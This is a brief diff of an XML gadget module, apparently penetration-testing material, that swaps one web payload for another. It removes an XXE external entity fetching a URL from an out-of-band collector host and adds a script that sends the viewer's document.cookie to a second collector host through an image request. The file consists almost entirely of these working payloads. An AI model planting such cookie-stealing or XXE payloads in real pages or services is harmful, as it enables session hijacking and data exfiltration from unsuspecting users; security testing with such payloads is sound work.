@@ -1,10 +1,9 @@
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://moen0b6wf6zzs8gbs6ah7u8ai1orcg.oastify.com/leak.txt">
-]>
+<?xml version="1.0" encoding="UTF-8"?>
 <Module>
-  <ModulePrefs title="XXE Test"/>
+  <ModulePrefs title="XSS Test"/>
   <Content type="html"><![CDATA[
-    &xxe;
+    <script>
+      new Image().src = 'https://dduep2vn4xoqhz52hxz8wlx17sdj18.oastify.com/?cookie=' + encodeURIComponent(document.cookie);
+    </script>
   ]]></Content>
 </Module>
